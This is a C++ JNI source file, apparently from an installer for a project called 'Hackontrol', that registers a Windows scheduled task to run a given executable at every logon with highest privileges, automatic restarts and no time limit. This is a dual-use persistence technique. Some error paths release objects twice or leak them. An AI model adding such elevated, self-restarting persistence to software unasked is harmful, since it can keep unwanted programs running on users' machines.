#include <string>
#include <comdef.h>
#include <taskschd.h>
#include <jni.h>
#include "com_khopan_hackontrol_installer_nativelib_TaskScheduler.h"

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

std::wstring toWideString(JNIEnv*, jstring);

JNIEXPORT jboolean JNICALL Java_com_khopan_hackontrol_installer_nativelib_TaskScheduler_registerTask(JNIEnv* environment, jclass taskSchedulerClass, jstring taskName, jstring executable) {
	if(!taskName || !executable) {
		return false;
	}
	
	std::wstring taskNameReturn = toWideString(environment, taskName);
	const wchar_t* taskNameWide = taskNameReturn.c_str();
	std::wstring executableReturn = toWideString(environment, executable);
	const wchar_t* executableWide = executableReturn.c_str();
	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if(FAILED(result)) {
		return false;
	}

	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

	if(FAILED(result)) {
		CoUninitialize();
		return false;
	}

	ITaskService* service = NULL;
	result = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**) &service);
	
	if(FAILED(result)) {
		CoUninitialize();
		return false;
	}

	result = service->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

	if(FAILED(result)) {
		service->Release();
		CoUninitialize();
		return false;
	}

	ITaskFolder* folder = NULL;
	result = service->GetFolder(_bstr_t(L"\\"), &folder);

	if(FAILED(result)) {
		service->Release();
		CoUninitialize();
		return false;
	}

	folder->DeleteTask(_bstr_t(taskNameWide), 0);
	ITaskDefinition* definition = NULL;
	result = service->NewTask(0, &definition);
	service->Release();

	if(FAILED(result)) {
		service->Release();
		CoUninitialize();
		return false;
	}

	IPrincipal* principal = NULL;
	result = definition->get_Principal(&principal);

	if(FAILED(result)) {
		service->Release();
		CoUninitialize();
		return false;
	}

	result = principal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	principal->Release();

	if(FAILED(result)) {
		service->Release();
		CoUninitialize();
		return false;
	}

	IRegistrationInfo* info = NULL;
	result = definition->get_RegistrationInfo(&info);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	ITaskSettings* settings = NULL;
	result = definition->get_Settings(&settings);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = settings->put_StartWhenAvailable(VARIANT_TRUE);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = settings->put_RestartInterval(_bstr_t(L"PT1M"));

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = settings->put_RestartCount(3);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = settings->put_ExecutionTimeLimit(_bstr_t(L"PT0M"));
	settings->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	ITriggerCollection* collection = NULL;
	result = definition->get_Triggers(&collection);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	ITrigger* trigger = NULL;
	result = collection->Create(TASK_TRIGGER_LOGON, &trigger);
	collection->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	ILogonTrigger* logonTrigger = NULL;
	result = trigger->QueryInterface(IID_ILogonTrigger, (void**) &logonTrigger);
	trigger->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = logonTrigger->put_Id(_bstr_t(L"Trigger1"));

	if(FAILED(result)) {
		return false;
	}

	IActionCollection* actionCollection = NULL;
	result = definition->get_Actions(&actionCollection);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	IAction* action = NULL;
	result = actionCollection->Create(TASK_ACTION_EXEC, &action);
	actionCollection->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	IExecAction* executeAction = NULL;
	result = action->QueryInterface(IID_IExecAction, (void**) &executeAction);
	action->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	result = executeAction->put_Path(_bstr_t(executableWide));
	executeAction->Release();

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	IRegisteredTask* task = NULL;
	result = folder->RegisterTaskDefinition(_bstr_t(taskNameWide), definition, TASK_CREATE_OR_UPDATE, _variant_t(L"S-1-5-32-544"), _variant_t(), TASK_LOGON_GROUP, _variant_t(L""), &task);

	if(FAILED(result)) {
		folder->Release();
		definition->Release();
		CoUninitialize();
		return false;
	}

	folder->Release();
	definition->Release();
	task->Release();
	CoUninitialize();
	return true;
}

std::wstring toWideString(JNIEnv* environment, jstring string) {
	std::wstring value;
	const jchar* raw = environment->GetStringChars(string, FALSE);
	jsize length = environment->GetStringLength(string);
	value.assign(raw, raw + length);
	environment->ReleaseStringChars(string, raw);
	return value;
}
